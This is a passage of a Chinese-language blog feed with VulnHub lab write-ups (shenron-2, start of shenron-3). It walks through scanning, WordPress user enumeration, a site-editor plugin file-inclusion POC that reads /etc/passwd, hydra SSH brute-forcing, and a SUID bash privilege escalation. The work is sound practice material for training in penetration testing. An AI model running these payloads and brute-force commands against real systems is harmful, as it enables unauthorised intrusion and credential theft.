class="line">|_http-title: shenron-2 &amp;#8211; Just another WordPress site</span><br><span class="line">MAC Address: 08:00:27:B2:AE:E0 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/26%OT=22%CT=1%CU=43507%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=6086679E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I</span><br><span class="line">OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O</span><br><span class="line">OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6</span><br><span class="line">OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O</span><br><span class="line">OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=</span><br><span class="line">OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%</span><br><span class="line">OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(</span><br><span class="line">OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=</span><br><span class="line">OS:N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.58 ms shenron-2.lan (192.168.4.199)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.01 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./shenron-2/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.199/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/shenron-1# gobuster dir -u http://192.168.4.199/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.199/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/26 03:11:56 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/license.txt (Status: 200)</span><br><span class="line">/README.txt (Status: 200)</span><br><span class="line">/LICENSE.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/26 03:15:00 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://shenron:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/shenron-2# gobuster dir -u http://shenron:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://shenron:8080/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/26 03:20:38 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content (Status: 301)</span><br><span class="line">/index.php (Status: 301)</span><br><span class="line">/license.txt (Status: 200)</span><br><span class="line">/wp-includes (Status: 301)</span><br><span class="line">/wp-login.php (Status: 200)</span><br><span class="line">/readme.html (Status: 200)</span><br><span class="line">/wp-trackback.php (Status: 200)</span><br><span class="line">/wp-admin (Status: 301)</span><br><span class="line">/wp-signup.php (Status: 302)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/26 03:23:15 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./shenron-2/2.png" alt></p>
<p><a href="http://192.168.4.199:8080/" target="_blank" rel="noopener">http://192.168.4.199:8080/</a></p>
<p><img data-src="./shenron-2/3.png" alt></p>
<ul>
<li>需要配置<code>hosts</code>后，正常访问</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.4.199 shenron</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-2/4.png" alt></p>
<h3 id="WPSCAN"><a href="#WPSCAN" class="headerlink" title="WPSCAN"></a>WPSCAN</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://shenron:8080/</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://shenron:8080/</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] It seems like you have not updated the database for some time.</span><br><span class="line">[?] Do you want to update now? [Y]es [N]o, default: [N]y</span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://shenron:8080/ [192.168.4.199]</span><br><span class="line">[+] Started: Mon Apr 26 03:21:45 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://shenron:8080/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://shenron:8080/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://shenron:8080/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://shenron:8080/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://shenron:8080/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;</span><br><span class="line"> |  - http://shenron:8080/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://shenron:8080/wp-content/themes/twentynineteen/</span><br><span class="line"> | Latest Version: 2.0 (up to date)</span><br><span class="line"> | Last Updated: 2021-03-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://shenron:8080/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | Style URL: http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentynineteen/</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.0 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0, Match: 'Version: 2.0'</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] site-editor</span><br><span class="line"> | Location: http://shenron:8080/wp-content/plugins/site-editor/</span><br><span class="line"> | Latest Version: 1.1.1 (up to date)</span><br><span class="line"> | Last Updated: 2017-05-02T23:34:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.1.1 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://shenron:8080/wp-content/plugins/site-editor/readme.txt</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;=========================================================================================================&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 26 03:21:55 2021</span><br><span class="line">[+] Requests Done: 183</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 40.057 KB</span><br><span class="line">[+] Data Received: 16.795 MB</span><br><span class="line">[+] Memory used: 233.918 MB</span><br><span class="line">[+] Elapsed time: 00:00:10</span><br></pre></td></tr></table></figure>

<ul>
<li>枚举用户名</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wpscan --url http://shenron:8080/ --enumerate u</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# wpscan --url http://shenron:8080/ --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.2</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://shenron:8080/ [192.168.4.199]</span><br><span class="line">[+] Started: Mon Apr 26 03:27:23 2021</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://shenron:8080/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://shenron:8080/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://shenron:8080/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://shenron:8080/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.7 identified (Insecure, released on 2021-03-09).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://shenron:8080/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;</span><br><span class="line"> |  - http://shenron:8080/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.7&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentynineteen</span><br><span class="line"> | Location: http://shenron:8080/wp-content/themes/twentynineteen/</span><br><span class="line"> | Latest Version: 2.0 (up to date)</span><br><span class="line"> | Last Updated: 2021-03-09T00:00:00.000Z</span><br><span class="line"> | Readme: http://shenron:8080/wp-content/themes/twentynineteen/readme.txt</span><br><span class="line"> | Style URL: http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0</span><br><span class="line"> | Style Name: Twenty Nineteen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentynineteen/</span><br><span class="line"> | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 2.0 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://shenron:8080/wp-content/themes/twentynineteen/style.css?ver=2.0, Match: 'Version: 2.0'</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;==========================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http://shenron:8080/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span><br><span class="line"></span><br><span class="line">[+] Finished: Mon Apr 26 03:27:25 2021</span><br><span class="line">[+] Requests Done: 22</span><br><span class="line">[+] Cached Requests: 34</span><br><span class="line">[+] Data Sent: 5.334 KB</span><br><span class="line">[+] Data Received: 39.123 KB</span><br><span class="line">[+] Memory used: 187.836 MB</span><br><span class="line">[+] Elapsed time: 00:00:02</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="http://shenron:8080/wp-admin/" target="_blank" rel="noopener">http://shenron:8080/wp-admin/</a> 登录后台，账号密码为<code>admin / admin</code>，有一些幸运</li>
</ul>
<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress</a></p>
<p><img data-src="./shenron-2/5.png" alt></p>
<ul>
<li><p>页面权限不足无法编辑，失败</p>
</li>
<li><p><code>site-editor 1.1.1</code>存在文件包含问题</p>
</li>
</ul>
<p><a href="https://www.exploit-db.com/exploits/44340" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44340</a></p>
<p>POC：<a href="http://192.168.4.199:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd" target="_blank" rel="noopener">http://192.168.4.199:8080/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class="line">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class="line">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false</span><br><span class="line">avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin</span><br><span class="line">saned:x:117:123::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin</span><br><span class="line">hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false</span><br><span class="line">whoopsie:x:120:125::/nonexistent:/bin/false</span><br><span class="line">colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin</span><br><span class="line">pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false</span><br><span class="line">gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false</span><br><span class="line">shenron:x:1000:1000:shenron,,,:/home/shenron:/bin/bash</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:126:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">jenny:x:1001:1001::/home/jenny:/bin/bash</span><br></pre></td></tr></table></figure>

<ul>
<li>破解</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jenny</span><br><span class="line">shenron</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jenny -P /usr/share/wordlists/rockyou.txt 192.168.4.199 -t 4 ssh</span><br><span class="line">hydra -l shenron -P /usr/share/wordlists/rockyou.txt 192.168.4.199 -t 4 ssh</span><br><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.4.199 -t 4 ssh</span><br></pre></td></tr></table></figure>

<p>得到账号密码 <code>jenny / jenny</code></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><img data-src="./shenron-2/6.png" alt></p>
<p>执行如图命令后</p>
<p><img data-src="./shenron-2/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/mnt/bash -p</span><br></pre></td></tr></table></figure>

<p><img data-src="./shenron-2/8.png" alt></p>
<ul>
<li>找到<code>shenron</code>密钥 <code>base32</code> 编码</li>
</ul>
<p><img data-src="./shenron-2/9.png" alt></p>
<p><img data-src="./shenron-2/10.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shenron / KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK</span><br><span class="line">shenron / ShEnRoNShEnRoNShEnRoNShEnRoNShEnRoN@ShEnRoN#ShEnRoNPaSsWoRd</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ssh shenron@192.168.4.199</code></li>
</ul>
<p><img data-src="./shenron-2/11.png" alt></p>
<p><img data-src="./shenron-2/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>shenron</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>shenron</tag>
      </tags>
  </entry>
  <entry>
    <title>shenron-3</title>
    <url>/2021/04/27/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/shenron-3/</url>
    <content><![CDATA[<h1 id="shenron-3"><a href="#shenron-3" class="headerlink" title="shenron-3"></a>shenron-3</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>shenron-3</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.125   08:00:27:5c:14:e1       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.129   b0:f8:93:24:54:f1       Shanghai MXCHIP Information Technology Co., Ltd.</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.968 seconds (130.08 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.125</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.125</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin/vulnhub/shenron-3# nmap -sV -A -p 1-65535 192.168.4.125</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-27 03:45 EDT</span><br><span class="line">Nmap scan report for shenron.lan (192.168.4.125)</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 4.6</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: shenron-3 | Just another WordPress site</span><br><span class="line">MAC Address: 08:00:27:5C:14:E1 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP 